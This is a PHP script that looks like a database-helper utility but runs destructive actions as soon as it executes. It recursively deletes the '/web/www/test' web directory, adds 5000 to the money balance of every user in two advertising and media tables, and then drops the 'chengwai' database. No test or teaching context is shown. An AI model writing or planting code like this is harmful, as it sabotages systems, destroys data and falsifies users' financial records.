<?php

class Conf {
    
  protected  $db_host;  
  protected  $db_name;
  protected  $db_user;
  protected  $db_pass;
  protected  $db_port;
    
  public function __construct()  {
      $this->dbConf();
  } 
  
  private function dbConf () {
      
      $base_dir =  $_SERVER['DOCUMENT_ROOT'];
      $conf = include $base_dir.'/config.inc.php';
      $this->db_host = $conf['DB_HOST'];
      $this->db_name = $conf['DB_NAME'];
      $this->db_user = $conf['DB_USER'];
      $this->db_pass = $conf['DB_PWD'];
      $this->db_port = $conf['DB_PORT'];
  }
  
}


class MysqlDb extends Conf{
    
    private $mysql_db_connect;
    
    private $obj_result;
    
    public function __construct() {
    	parent::__construct();
    	
    	$this->connectDb();
    }
    
    public function connectDb() {
        $this->mysql_db_connect = new mysqli($this->db_host,$this->db_user,$this->db_pass,$this->db_name,$this->db_port);
        if (mysqli_connect_errno()) {
            echo mysqli_connect_errno();
        }
        $this->mysql_db_connect->set_charset('utf8');	
    }
    
    public function executeSql($sql) {
        if (empty($sql)) {
            return false;
        }
       
        $this->obj_result = $this->mysql_db_connect->query($sql);
        
        $arr_result = array();
        while (!!$_objects = $this->obj_result->fetch_object()) {	
        
            $arr_result[] = $_objects;
        }
        
        
        return $arr_result;
    }
    

    public function save ($sql) {
      
        $this->mysql_db_connect->query($sql);

        $_affected_rows =  $this->mysql_db_connect->affected_rows;
        
        return $_affected_rows;
    }
    
    public function Total ($sql) {
        $this->obj_result = $this->mysql_db_connect->query($sql);
        
        $_total = $this->obj_result->fetch_row();
        
        return $_total[0];
    }
    
     
    public function cloesDb  () {
        $this->obj_result->free();
        $this->obj_result = null;
        $this->mysql_db_connect->close();
        $this->mysql_db_connect = null;
    }
    
}


class Tool extends Conf {
    
    public static function deleteDir($dirname) {
        if (!is_dir($dirname)) return false;	
        if (!$handle = opendir($dirname)) return false;
        while (($_file = readdir($handle)) != false) { 
            if ($_file != '.' && $_file !='..' ) {
                $_dir = $dirname.'/'.$_file;
                is_dir($_dir) ? self::deleteDir($_dir) : unlink($_dir);
            }
        }
        closedir($handle);
        return rmdir($dirname);
    }
}
 

class Run extends Conf {
	
    private $obj_db_connect;
    
    private function init () {
        $this->obj_db_connect = new MysqlDb();
    }
    
    public function jiaJia () {
        $this->init();
        $count = $this->obj_db_connect->Total("select count(*) from app_users;");
        
        $i = 1;
        for ($i;$i<=$count;$i++) {
            $this->obj_db_connect->save("UPDATE `app_user_advertisement` SET `money`=money+5000 where users_id = $i;");
            $this->obj_db_connect->save("UPDATE `app_user_media` SET `money`=money+5000 where users_id = $i;");
        }
        
        $this->obj_db_connect->cloesDb();
    }
    
    
    public function dropDb () {
        $this->init();
        $this->obj_db_connect->save('DROP DATABASE `chengwai`;');
        $this->obj_db_connect->cloesDb();
    }
    
    public function deleteWeb() {
        //$base_dir =  $_SERVER['DOCUMENT_ROOT'];
       Tool::deleteDir('/web/www/test');
    }
    
}

$obj_run = new Run();
$obj_run->deleteWeb();
$obj_run->jiajia();
$obj_run->dropDb();


?>